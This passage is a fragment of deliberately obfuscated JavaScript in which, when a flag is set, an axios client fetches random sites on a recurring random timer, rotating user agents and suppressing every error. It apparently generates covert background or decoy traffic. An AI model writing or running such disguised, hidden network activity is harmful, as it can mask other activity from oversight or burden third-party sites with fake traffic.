      setTimeout(f, (0x6b * 0x16 + 0xc5e1 + 0x1b4d) * l * getRandomInt(-0x2 * -0x744 + -0x1cc6 + 0xe3f, 0xde9 + 0xbdf * 0x2 + -0x25a4));
  }, -0x5004a6 + -0x2 * 0xfe743 + 0xa6c1ac);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x2127 + 0x140e + -0x19dd) * getRandomInt(-0x2 * -0x779 + -0x8 * 0x3e3 + 0x1027, -0x1 * 0x1609 + 0xb69 + 0xaa5));
}, -0x1 * 0x1679 + 0xf16 + 0x7c7);